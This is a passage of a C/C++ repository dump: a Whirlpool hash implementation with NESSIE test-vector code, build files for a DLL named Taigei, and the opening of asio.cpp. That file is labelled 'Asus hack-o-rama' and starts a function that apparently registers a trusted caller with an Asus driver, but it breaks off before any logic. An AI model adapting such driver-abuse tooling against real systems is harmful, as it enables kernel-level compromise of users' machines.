         */
        buffer[bufferPos++] |= (u8)(b >> bufferRem);
        bufferBits += 8 - bufferRem; /* bufferBits = 8*bufferPos; */
        if (bufferBits == DIGESTBITS) {
            /*
             * process data block:
             */
            processBuffer(structpointer);
            /*
             * reset buffer:
             */
            bufferBits = bufferPos = 0;
        }
        buffer[bufferPos] = b << (8 - bufferRem);
        bufferBits += bufferRem;
        /*
         * proceed to remaining data:
         */
        sourceBits -= 8;
        sourcePos++;
    }
    /* now 0 <= sourceBits <= 8;
     * furthermore, all data (if any is left) is in source[sourcePos].
     */
    if (sourceBits > 0) {
        b = (source[sourcePos] << sourceGap) & 0xff; /* bits are left-justified on b. */
        /*
         * process the remaining bits:
         */
        buffer[bufferPos] |= b >> bufferRem;
    }
    else {
        b = 0;
    }
    if (bufferRem + sourceBits < 8) {
        /*
         * all remaining data fits on buffer[bufferPos],
         * and there still remains some space.
         */
        bufferBits += sourceBits;
    }
    else {
        /*
         * buffer[bufferPos] is full:
         */
        bufferPos++;
        bufferBits += 8 - bufferRem; /* bufferBits = 8*bufferPos; */
        sourceBits -= 8 - bufferRem;
        /* now 0 <= sourceBits < 8;
         * furthermore, all data (if any is left) is in source[sourcePos].
         */
        if (bufferBits == DIGESTBITS) {
            /*
             * process data block:
             */
            processBuffer(structpointer);
            /*
             * reset buffer:
             */
            bufferBits = bufferPos = 0;
        }
        buffer[bufferPos] = b << (8 - bufferRem);
        bufferBits += (int)sourceBits;
    }
    structpointer->bufferBits = bufferBits;
    structpointer->bufferPos = bufferPos;
}

/**
 * Get the hash value from the hashing state.
 *
 * This method uses the invariant: bufferBits < DIGESTBITS
 */
void NESSIEfinalize(struct NESSIEstruct* const structpointer,
    unsigned char* const result) {
    int i;
    u8* buffer = structpointer->buffer;
    u8* bitLength = structpointer->bitLength;
    int bufferBits = structpointer->bufferBits;
    int bufferPos = structpointer->bufferPos;
    u8* digest = result;

    /*
     * append a '1'-bit:
     */
    buffer[bufferPos] |= 0x80U >> (bufferBits & 7);
    bufferPos++; /* all remaining bits on the current u8 are set to zero. */
    /*
     * pad with zero bits to complete (N*WBLOCKBITS - LENGTHBITS) bits:
     */
    if (bufferPos > WBLOCKBYTES - LENGTHBYTES) {
        if (bufferPos < WBLOCKBYTES) {
            memset(&buffer[bufferPos], 0, WBLOCKBYTES - bufferPos);
        }
        /*
         * process data block:
         */
        processBuffer(structpointer);
        /*
         * reset buffer:
         */
        bufferPos = 0;
    }
    if (bufferPos < WBLOCKBYTES - LENGTHBYTES) {
        memset(&buffer[bufferPos], 0, (WBLOCKBYTES - LENGTHBYTES) - bufferPos);
    }
    bufferPos = WBLOCKBYTES - LENGTHBYTES;
    /*
     * append bit length of hashed data:
     */
    memcpy(&buffer[WBLOCKBYTES - LENGTHBYTES], bitLength, LENGTHBYTES);
    /*
     * process data block:
     */
    processBuffer(structpointer);
    /*
     * return the completed message digest:
     */
    for (i = 0; i < DIGESTBYTES / 8; i++) {
        digest[0] = (u8)(structpointer->hash[i] >> 56);
        digest[1] = (u8)(structpointer->hash[i] >> 48);
        digest[2] = (u8)(structpointer->hash[i] >> 40);
        digest[3] = (u8)(structpointer->hash[i] >> 32);
        digest[4] = (u8)(structpointer->hash[i] >> 24);
        digest[5] = (u8)(structpointer->hash[i] >> 16);
        digest[6] = (u8)(structpointer->hash[i] >> 8);
        digest[7] = (u8)(structpointer->hash[i]);
        digest += 8;
    }
    structpointer->bufferBits = bufferBits;
    structpointer->bufferPos = bufferPos;
}

static void display(const u8 array[], int length) {
    int i;
    for (i = 0; i < length; i++) {
        if (i % 32 == 0) {
            printf("\n");
        }
        if (i % 8 == 0) {
            printf(" ");
        }
        printf("%02X", array[i]);
    }
}

#define LONG_ITERATION 100000000

/**
 * Generate the test vector set for Whirlpool.
 *
 * The test consists of:
 * 1. hashing all bit strings containing only zero bits
 *    for all lengths from 0 to 1023;
 * 2. hashing all 512-bit strings containing a single set bit;
 * 3. the iterated hashing of the 512-bit string of zero bits a large number of times.
 */
void makeNESSIETestVectors() {
    int i;
    struct NESSIEstruct w;
    u8 digest[DIGESTBYTES];
    u8 data[128];

    memset(data, 0, sizeof(data));
    printf("Message digests of strings of 0-bits and length L:\n");
    for (i = 0; i < 1024; i++) {
        NESSIEinit(&w);
        NESSIEadd(data, i, &w);
        NESSIEfinalize(&w, digest);
        printf("    L = %4d: ", i); display(digest, DIGESTBYTES); printf("\n");
    }
    printf("Message digests of all 512-bit strings S containing a single 1-bit:\n");
    memset(data, 0, sizeof(data));
    for (i = 0; i < 512; i++) {
        /* set bit i: */
        data[i / 8] |= 0x80U >> (i % 8);
        NESSIEinit(&w);
        NESSIEadd(data, 512, &w);
        NESSIEfinalize(&w, digest);
        printf("    S = "); display(data, 512 / 8); printf(": ");
        display(digest, DIGESTBYTES); printf("\n");
        /* reset bit i: */
        data[i / 8] = 0;
    }
    memset(digest, 0, sizeof(digest));
    for (i = 0; i < LONG_ITERATION; i++) {
        NESSIEinit(&w);
        NESSIEadd(digest, 512, &w);
        NESSIEfinalize(&w, digest);
    }
    fflush(stdout);
    printf("Iterated message digest computation (%d times): ", LONG_ITERATION);
    display(digest, DIGESTBYTES); printf("\n");
}



/*
#define TIMING_ITERATIONS 100000

static void timing() {
    int i;
    NESSIEstruct w;
    u8 digest[DIGESTBYTES];
    u8 data[1024];
    clock_t elapsed;
    float sec;

    memset(data, 0, sizeof(data));

    printf("Overall timing...");
    elapsed = -clock();
    for (i = 0; i < TIMING_ITERATIONS; i++) {
        NESSIEinit(&w);
        NESSIEadd(data, 8*sizeof(data), &w);
        NESSIEfinalize(&w, digest);
    }
    elapsed += clock();
    sec = (float)elapsed/CLOCKS_PER_SEC;
    printf(" %.1f s, %.1f Mbit/s, %.1f cycles/byte.\n",
        sec,
        (float)8*sizeof(data)*TIMING_ITERATIONS/sec/1000000,
        (float)550e6*sec/(sizeof(data)*TIMING_ITERATIONS));

    printf("Compression function timing...");
    NESSIEinit(&w);
    elapsed = -clock();
    for (i = 0; i < TIMING_ITERATIONS; i++) {
        processBuffer(&w);
    }
    elapsed += clock();
    NESSIEfinalize(&w, digest);
    sec = (float)elapsed/CLOCKS_PER_SEC;
    printf(" %.1f s, %.1f Mbit/s, %.1f cycles/byte.\n",
        sec,
        (float)512*TIMING_ITERATIONS/sec/1000000,
        (float)550e6*sec/(64*TIMING_ITERATIONS));
}
*/

#ifdef TRACE_INTERMEDIATE_VALUES
static void makeIntermediateValues() {
    struct NESSIEstruct w;
    u8 digest[DIGESTBYTES];

    printf("3. In this example the data-string is the three-byte string consisting of the ASCII-coded version of 'abc'.\n\n");
    NESSIEinit(&w);
    NESSIEadd("abc", 8 * 3, &w);
    NESSIEfinalize(&w, digest);
    printf("The hash-code is the following 512-bit string.\n\n");
    display(digest, DIGESTBYTES); printf("\n\n");

    printf("8. In this example the data-string is the 32-byte string consisting of the ASCII-coded version of 'abcdbcdecdefdefgefghfghighijhijk'.\n\n");
    NESSIEinit(&w);
    NESSIEadd("abcdbcdecdefdefgefghfghighijhijk", 8 * 32, &w);
    NESSIEfinalize(&w, digest);
    printf("The hash-code is the following 512-bit string.\n\n");
    display(digest, DIGESTBYTES); printf("\n\n");
    fflush(stdout);

    fflush(stdout);
}
#endif /* ?TRACE_INTERMEDIATE_VALUES */

#if 0
int main(int argc, char* argv[]) {
    /* testAPI(); */
    /* makeNESSIETestVectors(); */
    makeISOTestVectors();
#ifdef TRACE_INTERMEDIATE_VALUES
    makeIntermediateValues();
#endif /* ?TRACE_INTERMEDIATE_VALUES */
    /* timing(); */
    return 0;
}
#endif

#if defined (_MSC_VER)
#pragma warning(pop)
#endif

```

`Source/Shared/thirdparty/whirlpool/whirlpool.h`:

```h
#include "nessie.h"

void NESSIEinit(struct NESSIEstruct* const structpointer);
void NESSIEadd(const unsigned char* const source, unsigned long sourceBits, struct NESSIEstruct* const structpointer);
void NESSIEfinalize(struct NESSIEstruct* const structpointer, unsigned char* const result);

```

`Source/Taigei/Taigei.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{82970d46-0966-4d20-9158-c0eb05090488}</ProjectGuid>
    <RootNamespace>Taigei</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>Taigei64</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>Taigei32</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
    <TargetName>Taigei64</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
    <TargetName>Taigei32</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
      <MinimumRequiredVersion>6.0</MinimumRequiredVersion>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;TAIGEI_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
      <MinimumRequiredVersion>6.0</MinimumRequiredVersion>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\Shared\minirtl\strtoul.c" />
    <ClCompile Include="..\Shared\minirtl\ultohex.c" />
    <ClCompile Include="..\Shared\minirtl\_strcat.c" />
    <ClCompile Include="..\Shared\minirtl\_strcpy.c" />
    <ClCompile Include="..\Shared\minirtl\_strend.c" />
    <ClCompile Include="..\Shared\minirtl\_strncmpi.c" />
    <ClCompile Include="asio.cpp" />
    <ClCompile Include="ipc.cpp" />
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Shared\minirtl\minirtl.h" />
    <ClInclude Include="..\Shared\minirtl\rtltypes.h" />
    <ClInclude Include="..\Shared\ntos\ntos.h" />
    <ClInclude Include="asio.h" />
    <ClInclude Include="global.h" />
    <ClInclude Include="ipc.h" />
  </ItemGroup>
  <ItemGroup>
    <None Include="export.def" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Taigei/Taigei.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="ntos">
      <UniqueIdentifier>{a4f6a72c-7556-4f04-a0d3-56a379a22920}</UniqueIdentifier>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{6ca26a97-e04d-4f1e-870e-560eea4659be}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strncmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\ultohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="ipc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="asio.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\strtoul.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Shared\ntos\ntos.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\minirtl.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\rtltypes.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="ipc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="global.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="asio.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <None Include="export.def">
      <Filter>Header Files</Filter>
    </None>
  </ItemGroup>
</Project>
```

`Source/Taigei/Taigei.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`Source/Taigei/asio.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       ASIO.CPP
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Asus hack-o-rama v3.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID RegisterTrustedCallerForAsIO()
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceName;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    PROCESS_BASIC_INFORMATION pbi;

    DWORD dummyValue, parentPID;

    LARGE_INTEGER liTimeOut;
    HANDLE deviceHandle;

